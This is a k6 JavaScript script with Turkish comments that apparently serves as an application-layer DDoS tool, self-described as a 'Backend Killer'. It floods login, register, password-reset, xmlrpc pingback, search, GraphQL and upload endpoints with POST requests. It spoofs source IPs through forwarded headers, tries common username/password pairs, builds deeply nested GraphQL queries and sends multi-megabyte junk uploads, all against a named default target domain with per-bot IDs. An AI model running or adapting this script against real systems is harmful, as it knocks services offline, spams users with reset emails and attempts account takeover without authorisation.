// ================================================================
// 💣 k6 POST FLOOD — Backend CPU/DB Killer
//
// STRATEJİ:
//   Pure POST spam — cache tamamen bypass (POST asla cache'lenmez).
//   Backend'in her isteği işlemesi ZORUNLU:
//     - CSRF token check
//     - Form validation
//     - Database INSERT/SELECT
//     - Session creation
//     - Password hashing (login denemesinde en pahalı işlem!)
//     - Email validation
//     - Rate limit check
//
//   Bcrypt/argon2 hash 100-300ms CPU yer → 100 istek/sn = CPU %100
//   SQL INSERT her seferde disk write → I/O çöker
//
// HEDEF:
//   Login/register/search/graphql endpoint'leri
//   WordPress xmlrpc.php (pingback flood klasiği)
//   FastAPI/Django auth katmanı
//
// ENV: TARGET_URL, DURATION, VUS, RPS, BOT_ID, HOST_HEADER
// ================================================================

import http from 'k6/http';
import { check } from 'k6';
import exec from 'k6/execution';
import { Counter, Trend, Rate } from 'k6/metrics';
import { randomIntBetween, randomString, randomItem } from 'https://jslib.k6.io/k6-utils/1.4.0/index.js';

const TARGET_URL = (__ENV.TARGET_URL || 'https://hhh.frostai.com.tr').replace(/\/$/, '');
const BOT_ID = __ENV.BOT_ID || '0';
const HOST_HEADER = __ENV.HOST_HEADER || '';
const DURATION = __ENV.DURATION || '2m';
const VUS = parseInt(__ENV.VUS || '300', 10);
const RPS = parseInt(__ENV.RPS || '0', 10);

const bytesReceived = new Counter('bytes_received_total');
const bytesSent = new Counter('bytes_sent_total');
const rate2xx = new Rate('rate_2xx');
const rate4xx = new Rate('rate_4xx');
const rate5xx = new Rate('rate_5xx');
const rate429 = new Rate('rate_429');
const responseTime = new Trend('response_time_ms', true);
const ttfb = new Trend('ttfb_ms', true);

// ================================================================
// POST ATTACK VECTORS
// ================================================================
const POST_ENDPOINTS = [
    // WordPress
    { path: '/wp-login.php', weight: 15, type: 'wp_login' },
    { path: '/wp-admin/admin-ajax.php', weight: 10, type: 'wp_ajax' },
    { path: '/xmlrpc.php', weight: 12, type: 'xmlrpc' },
    { path: '/wp-comments-post.php', weight: 8, type: 'wp_comment' },
    { path: '/?wc-ajax=add_to_cart', weight: 6, type: 'woo_cart' },

    // Auth endpoint'leri (bcrypt/argon2 → CPU killer)
    { path: '/login', weight: 15, type: 'login' },
    { path: '/api/login', weight: 12, type: 'login' },
    { path: '/api/auth/login', weight: 10, type: 'login' },
    { path: '/api/v1/auth/login', weight: 10, type: 'login' },
    { path: '/oauth/token', weight: 8, type: 'oauth' },
    { path: '/api/token/', weight: 6, type: 'token' },

    // Register (email validation + DB insert)
    { path: '/register', weight: 10, type: 'register' },
    { path: '/api/register', weight: 8, type: 'register' },
    { path: '/api/auth/register', weight: 8, type: 'register' },
    { path: '/api/users', weight: 6, type: 'register' },
    { path: '/signup', weight: 6, type: 'register' },

    // Password reset (email gönderme trigger'lar)
    { path: '/forgot-password', weight: 8, type: 'forgot' },
    { path: '/api/password/reset', weight: 6, type: 'forgot' },
    { path: '/api/auth/forgot-password', weight: 6, type: 'forgot' },

    // Search API (DB scan)
    { path: '/api/search', weight: 12, type: 'search' },
    { path: '/api/v1/search', weight: 10, type: 'search' },
    { path: '/search', weight: 8, type: 'search' },

    // GraphQL (heavy query executor)
    { path: '/graphql', weight: 12, type: 'graphql' },
    { path: '/api/graphql', weight: 8, type: 'graphql' },
    { path: '/v1/graphql', weight: 6, type: 'graphql' },

    // Contact/newsletter (DB insert + potansiyel email)
    { path: '/contact', weight: 8, type: 'contact' },
    { path: '/api/contact', weight: 6, type: 'contact' },
    { path: '/newsletter/subscribe', weight: 6, type: 'newsletter' },
    { path: '/api/newsletter', weight: 4, type: 'newsletter' },

    // Comments (WP + generic)
    { path: '/api/comments', weight: 6, type: 'comment' },
    { path: '/api/v1/comments', weight: 4, type: 'comment' },

    // File upload endpoint'leri (multipart yavaş)
    { path: '/api/upload', weight: 4, type: 'upload' },
    { path: '/api/media', weight: 3, type: 'upload' }
];

const totalWeight = POST_ENDPOINTS.reduce((s, e) => s + e.weight, 0);
const cumWeights = [];
let acc = 0;
for (const e of POST_ENDPOINTS) {
    acc += e.weight;
    cumWeights.push(acc);
}

function pickEndpoint() {
    const r = Math.random() * totalWeight;
    for (let i = 0; i < cumWeights.length; i++) {
        if (r < cumWeights[i]) return POST_ENDPOINTS[i];
    }
    return POST_ENDPOINTS[0];
}

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
];

const COMMON_PASSWORDS = [
    'password', 'password123', '123456', 'admin', 'admin123', 'root', 'toor',
    'qwerty', 'letmein', 'welcome', 'monkey', 'dragon', 'master', 'test',
    'user', 'password1', 'iloveyou', 'sunshine', '12345678', 'football'
];

const COMMON_USERNAMES = [
    'admin', 'administrator', 'root', 'user', 'test', 'demo', 'guest',
    'webmaster', 'info', 'contact', 'sales', 'support', 'help'
];

function randomIP() {
    const a = randomIntBetween(1, 223);
    if (a === 10 || a === 127 || a === 172 || a === 192) return randomIP();
    return `${a}.${randomIntBetween(0, 255)}.${randomIntBetween(0, 255)}.${randomIntBetween(1, 254)}`;
}

function buildHeaders(endpoint) {
    const h = {
        'User-Agent': randomItem(USER_AGENTS),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': endpoint.type === 'xmlrpc' ? 'text/xml'
            : endpoint.type === 'wp_login' || endpoint.type === 'wp_comment' || endpoint.type === 'wp_ajax'
                ? 'application/x-www-form-urlencoded'
                : endpoint.type === 'upload' ? 'multipart/form-data; boundary=----WebKitFormBoundary' + randomString(16)
                    : 'application/json',
        'Origin': TARGET_URL,
        'Referer': `${TARGET_URL}${endpoint.path}`,
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'X-Forwarded-For': randomIP(),
        'X-Real-IP': randomIP(),
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'DNT': '1',
        'Connection': 'keep-alive'
    };
    if (HOST_HEADER) h['Host'] = HOST_HEADER;
    return h;
}

// ================================================================
// BODY GENERATORS — Her endpoint tipine özel
// ================================================================
function buildBody(endpoint) {
    const type = endpoint.type;

    if (type === 'wp_login') {
        return `log=${encodeURIComponent(randomItem(COMMON_USERNAMES))}&pwd=${encodeURIComponent(randomItem(COMMON_PASSWORDS))}&wp-submit=Log+In&redirect_to=${encodeURIComponent(TARGET_URL + '/wp-admin/')}&testcookie=1`;
    }

    if (type === 'wp_ajax') {
        const actions = ['wc_ajax_get_refreshed_fragments', 'heartbeat', 'load-scripts', 'load-styles', 'query-attachments'];
        return `action=${randomItem(actions)}&_wpnonce=${randomString(10, 'abcdef0123456789')}&data=${encodeURIComponent(randomString(randomIntBetween(50, 500)))}`;
    }

    if (type === 'wp_comment') {
        return `author=${encodeURIComponent(randomString(10))}&email=${encodeURIComponent(randomString(8) + '@' + randomString(6) + '.com')}&url=${encodeURIComponent('https://' + randomString(10) + '.com')}&comment=${encodeURIComponent(randomString(randomIntBetween(50, 300)))}&comment_post_ID=${randomIntBetween(1, 1000)}&comment_parent=0`;
    }

    if (type === 'xmlrpc') {
        // Klasik pingback flood
        return `<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>https://${randomString(10)}.com/post/${randomIntBetween(1, 1000)}</string></value></param>
    <param><value><string>${TARGET_URL}/?p=${randomIntBetween(1, 1000)}</string></value></param>
  </params>
</methodCall>`;
    }

    if (type === 'login') {
        return JSON.stringify({
            username: randomItem(COMMON_USERNAMES),
            email: `${randomString(8)}@${randomString(6)}.com`,
            password: randomItem(COMMON_PASSWORDS) + randomIntBetween(1, 999),
            remember_me: Math.random() > 0.5,
            csrf_token: randomString(32),
            device_id: randomString(16)
        });
    }

    if (type === 'oauth' || type === 'token') {
        return JSON.stringify({
            grant_type: 'password',
            username: randomItem(COMMON_USERNAMES),
            password: randomItem(COMMON_PASSWORDS),
            client_id: randomString(24),
            client_secret: randomString(40),
            scope: 'read write'
        });
    }

    if (type === 'register') {
        return JSON.stringify({
            username: randomString(randomIntBetween(6, 14)),
            email: `${randomString(10)}@${randomString(6)}.${randomItem(['com', 'net', 'org', 'io'])}`,
            password: randomString(16) + '!A1',
            password_confirmation: randomString(16) + '!A1',
            first_name: randomString(8),
            last_name: randomString(10),
            phone: `+90${randomIntBetween(5000000000, 5999999999)}`,
            terms_accepted: true,
            newsletter: true,
            csrf_token: randomString(32)
        });
    }

    if (type === 'forgot') {
        return JSON.stringify({
            email: `${randomString(10)}@${randomString(6)}.com`,
            csrf_token: randomString(32)
        });
    }

    if (type === 'search') {
        // Ağır arama — %like% wildcard + join + order by
        return JSON.stringify({
            query: randomString(randomIntBetween(10, 50)),
            filters: {
                category: Array.from({ length: randomIntBetween(1, 5) }, () => randomIntBetween(1, 100)),
                price_min: randomIntBetween(0, 1000),
                price_max: randomIntBetween(1000, 100000),
                brand: Array.from({ length: randomIntBetween(1, 3) }, () => randomString(8)),
                tags: Array.from({ length: randomIntBetween(1, 10) }, () => randomString(6)),
                date_from: '2020-01-01',
                date_to: '2026-12-31'
            },
            page: randomIntBetween(1, 100),
            per_page: 100,
            sort: 'relevance',
            include: ['images', 'reviews', 'related', 'variants', 'categories', 'tags']
        });
    }

    if (type === 'graphql') {
        // Nested query — resolver bombası
        return JSON.stringify({
            query: `query DeepQuery {
                users(limit: 100) {
                    id name email
                    posts(limit: 50) {
                        id title content
                        comments(limit: 20) {
                            id text author { id name email posts { id title } }
                        }
                        tags { id name }
                    }
                    followers(limit: 100) { id name email }
                    following(limit: 100) { id name email }
                }
                products(limit: 100) {
                    id name price
                    reviews(limit: 20) { id rating text user { id name } }
                    variants { id sku price stock }
                }
            }`,
            variables: { search: randomString(20) },
            operationName: 'DeepQuery'
        });
    }

    if (type === 'contact') {
        return JSON.stringify({
            name: randomString(randomIntBetween(6, 15)),
            email: `${randomString(8)}@${randomString(6)}.com`,
            phone: `+90${randomIntBetween(5000000000, 5999999999)}`,
            subject: randomString(randomIntBetween(20, 80)),
            message: randomString(randomIntBetween(200, 2000)),
            company: randomString(15),
            csrf_token: randomString(32)
        });
    }

    if (type === 'newsletter') {
        return JSON.stringify({
            email: `${randomString(10)}@${randomString(6)}.com`,
            name: randomString(10),
            preferences: ['news', 'promotions', 'updates']
        });
    }

    if (type === 'comment') {
        return JSON.stringify({
            post_id: randomIntBetween(1, 10000),
            content: randomString(randomIntBetween(50, 500)),
            author_name: randomString(10),
            author_email: `${randomString(8)}@example.com`,
            parent_id: 0
        });
    }

    if (type === 'woo_cart') {
        return `product_id=${randomIntBetween(1, 1000)}&quantity=${randomIntBetween(1, 10)}&variation_id=${randomIntBetween(1, 500)}`;
    }

    if (type === 'upload') {
        // Fake multipart body (2-8 MB)
        const size = randomIntBetween(2, 8) * 1024 * 1024;
        return `------WebKitFormBoundary${randomString(16)}\r\nContent-Disposition: form-data; name="file"; filename="${randomString(10)}.jpg"\r\nContent-Type: image/jpeg\r\n\r\n${randomString(size)}\r\n------WebKitFormBoundary--\r\n`;
    }

    // Generic fallback
    return JSON.stringify({
        data: randomString(randomIntBetween(200, 2000)),
        timestamp: Date.now(),
        nonce: randomString(32)
    });
}

// ================================================================
// K6 OPTIONS
// ================================================================
function buildScenarios() {
    if (RPS > 0) {
        return {
            post_flood: {
                executor: 'constant-arrival-rate',
                rate: RPS,
                timeUnit: '1s',
                duration: DURATION,
                preAllocatedVUs: Math.min(VUS, 500),
                maxVUs: VUS * 4,
                gracefulStop: '10s'
            }
        };
    }
    return {
        post_flood: {
            executor: 'ramping-arrival-rate',
            startRate: Math.max(50, VUS),
            timeUnit: '1s',
            preAllocatedVUs: Math.min(VUS, 500),
            maxVUs: VUS * 5,
            stages: [
                { duration: '10s', target: VUS * 5 },
                { duration: DURATION, target: VUS * 10 },
                { duration: '5s', target: 0 }
            ],
            gracefulStop: '10s'
        }
    };
}

export const options = {
    scenarios: buildScenarios(),
    discardResponseBodies: false,
    batch: 20,
    batchPerHost: 20,
    insecureSkipTLSVerify: true,
    userAgent: '',
    tlsVersion: { min: 'tls1.2', max: 'tls1.3' },
    summaryTrendStats: ['avg', 'min', 'med', 'max', 'p(90)', 'p(95)', 'p(99)'],
    thresholds: { 'http_reqs': ['count>=0'] }
};

export function setup() {
    console.log(`═══════════════════════════════════════`);
    console.log(`  BOT #${BOT_ID} — POST FLOOD (Backend Killer)`);
    console.log(`  Target : ${TARGET_URL}`);
    console.log(`  Host   : ${HOST_HEADER || '(default)'}`);
    console.log(`  Duration: ${DURATION}`);
    console.log(`  Endpoints: ${POST_ENDPOINTS.length} POST vectors`);
    console.log(`═══════════════════════════════════════`);
}

// ---- LIVE PROGRESS LOGGER ----
let __lastProgressLog = 0;
let __localReqs = 0;
let __local2xx = 0;
let __local5xx = 0;
let __local429 = 0;

function logProgress(res) {
    __localReqs++;
    if (res.status >= 200 && res.status < 300) __local2xx++;
    else if (res.status >= 500) __local5xx++;
    else if (res.status === 429) __local429++;

    if (exec.vu.idInTest !== 1) return;
    const now = Date.now();
    if (now - __lastProgressLog < 5000) return;
    __lastProgressLog = now;

    const elapsed = Math.floor(exec.instance.currentTestRunDuration / 1000);
    const vusActive = exec.instance.vusActive || 0;
    const iters = exec.instance.iterationsCompleted || __localReqs;
    const rps = elapsed > 0 ? Math.floor(iters / elapsed) : 0;
    const pct2xx = __localReqs > 0 ? Math.floor((__local2xx / __localReqs) * 100) : 0;
    const pct5xx = __localReqs > 0 ? Math.floor((__local5xx / __localReqs) * 100) : 0;
    const pct429 = __localReqs > 0 ? Math.floor((__local429 / __localReqs) * 100) : 0;

    console.log(`[LIVE bot=${BOT_ID}] POST | t=${elapsed}s | iters=${iters} | vus=${vusActive} | rps~${rps} | 2xx=${pct2xx}% 5xx=${pct5xx}% 429=${pct429}% | last=${res.status}`);
}

export default function () {
    const endpoint = pickEndpoint();
    const url = TARGET_URL + endpoint.path;
    const body = buildBody(endpoint);
    const headers = buildHeaders(endpoint);

    const res = http.post(url, body, {
        headers: headers,
        timeout: '30s',
        tags: {
            endpoint_type: endpoint.type,
            method: 'POST'
        },
        redirects: 2
    });

    if (res.body) bytesReceived.add(res.body.length);
    bytesSent.add(body.length);
    rate2xx.add(res.status >= 200 && res.status < 300);
    rate4xx.add(res.status >= 400 && res.status < 500);
    rate5xx.add(res.status >= 500);
    rate429.add(res.status === 429);
    responseTime.add(res.timings.duration);
    ttfb.add(res.timings.waiting);

    check(res, {
        'server responded': (r) => r.status > 0
    });

    logProgress(res);
}

export function handleSummary(data) {
    const m = data.metrics;
    const reqs = m.http_reqs ? (m.http_reqs.values.count || 0) : 0;
    const bytesIn = m.data_received ? (m.data_received.values.count || 0) : 0;
    const bytesOut = m.data_sent ? (m.data_sent.values.count || 0) : 0;
    const failed = m.http_req_failed ? (m.http_req_failed.values.rate || 0) : 0;
    const p50 = m.http_req_duration ? (m.http_req_duration.values.med || 0) : 0;
    const p95 = m.http_req_duration ? (m.http_req_duration.values['p(95)'] || 0) : 0;
    const p99 = m.http_req_duration ? (m.http_req_duration.values['p(99)'] || 0) : 0;
    const r2xx = m.rate_2xx ? (m.rate_2xx.values.rate * 100).toFixed(1) : '0.0';
    const r4xx = m.rate_4xx ? (m.rate_4xx.values.rate * 100).toFixed(1) : '0.0';
    const r5xx = m.rate_5xx ? (m.rate_5xx.values.rate * 100).toFixed(1) : '0.0';
    const r429 = m.rate_429 ? (m.rate_429.values.rate * 100).toFixed(1) : '0.0';

    const summary =
        `═══════════════════════════════════════════════════
  BOT #${BOT_ID} — POST FLOOD SUMMARY
═══════════════════════════════════════════════════
  Toplam POST      : ${reqs}
  Veri gönderilen  : ${(bytesOut / 1024 / 1024).toFixed(2)} MB
  Veri alınan      : ${(bytesIn / 1024 / 1024).toFixed(2)} MB
  Hata oranı       : ${(failed * 100).toFixed(2)}%
  ---------------------------------------------------
  2xx (kabul)      : ${r2xx}%
  4xx (reddedildi) : ${r4xx}%
  5xx (çöktü)      : ${r5xx}%
  429 (rate limit) : ${r429}%
  ---------------------------------------------------
  Response p50     : ${p50.toFixed(0)}ms
  Response p95     : ${p95.toFixed(0)}ms
  Response p99     : ${p99.toFixed(0)}ms
═══════════════════════════════════════════════════
`;

    const result = {};
    result['stdout'] = summary;
    result[`reports/bot-${BOT_ID}-summary.json`] = JSON.stringify(data);
    return result;
}